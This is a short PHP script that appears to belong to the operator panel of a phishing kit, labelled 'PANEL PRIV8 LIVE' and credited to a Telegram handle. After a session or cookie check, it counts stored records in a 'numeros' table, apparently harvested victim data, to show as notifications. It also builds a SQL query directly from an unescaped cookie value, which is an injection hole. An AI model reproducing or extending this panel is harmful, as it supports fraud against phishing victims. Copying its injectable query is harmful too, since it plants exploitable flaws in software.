<?php
/**
* PANEL PRIV8 LIVE
* @package    lock.php
* @author     https://t.me/neo_net
* @copyright  2021
* @version    2.0
* Info :  PHP comment
*/
session_start();
include '../database/db.php';
//include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$notification = $connection->query("SELECT * FROM numeros");
$notification2 = $connection->query("SELECT * FROM numeros where movil IS NOT NULL");
$notification3 = $connection->query("SELECT * FROM numeros where stella IS NOT NULL");
if (mysqli_num_rows($notification2) == '') {
$om = 0;
}else {
$om = mysqli_num_rows($notification2);
}
if (mysqli_num_rows($notification3) == '') {
$om2 = 0;
}else {
$om2 = mysqli_num_rows($notification3);
}

if(mysqli_num_rows($notification) === 0){
echo 0+$om+$om2;
}

else{
	if (mysqli_num_rows($notification) == '') {
echo 0+$om+$om2;
	}else{
echo mysqli_num_rows($notification)+$om+$om2;
}

}
}